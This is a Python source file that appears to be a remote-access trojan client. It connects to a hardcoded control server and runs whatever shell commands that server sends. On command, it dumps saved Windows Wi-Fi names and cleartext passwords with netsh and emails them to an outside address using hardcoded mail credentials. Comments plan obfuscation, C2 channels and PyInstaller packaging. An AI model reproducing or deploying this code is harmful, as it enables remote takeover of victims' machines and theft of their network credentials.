import os
import socket
import subprocess
import smtplib as smtp
from lib2to3.pgen2.grammar import line

HOST = '192.168.1.72'
PORT = 9090

def tron():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    while True:
        server_command = client.recv(1024).decode('cp866')
        if server_command == 'cmdon':
            cmd_mode = True
            client.send('Получен доступ к терминалу'.encode('cp866'))
            continue
        if server_command == 'cmdoff':
            cmd_mode = False
        if cmd_mode:
            os.popen(server_command)
        else:
            if server_command == 'hello':
                print('welcome to the rice fields MF')
                client.send(f'{server_command} успешно отправлена!'.encode('cp866'))
        if server_command == 'Wi-Fi':
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
            WiFis = [line.split(':')[1]
            [1:-1] for line in data if "Все профили пользователей" in line]
        for WiFi in WiFis:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', WiFi, 'key=clear']).decode(
                'cp866').split('\n')
            results = [line.split(':')[1]
                       [1:-1] for line in results if "Содержимое ключа" in line]
            try:
                email = 'faxtrotuniform@yandex.ru'
                password = 'Charley'
                dest_email = 'alexandr9514@yandex.ru'
                subject = 'Wifi'
                email_text = (f'Name: {WiFi}, Password: {results[0]}')
                message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)

                server = smtp.SMTP_SSL('smtp.yandex.com')
                server.set_debuglevel(1)
                server.ehlo(email)
                server.login(email, password)
                server.auth_plain()
                server.sendmail(email, dest_email, message)
                server.quit()

            except IndexError:
                email = 'faxtrotuniform@yandex.ru'
                password = 'Charley'
                dest_email = 'alexandr9514@yandex.ru'
                subject = 'Wifi'
                email_text = (f'Name: {WiFi}, Password not found!')
                message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)

                server = smtp.SMTP_SSL('smtp.yandex.com')
                server.set_debuglevel(1)
                server.ehlo(email)
                server.login(email, password)
                server.auth_plain()
                server.sendmail(email, dest_email, message)
                server.quit()
#todo Защита канала передачи
#todo Защита самого кода
#todo Способы связи с управляющими серверами
#todo упаковать PyInstaller







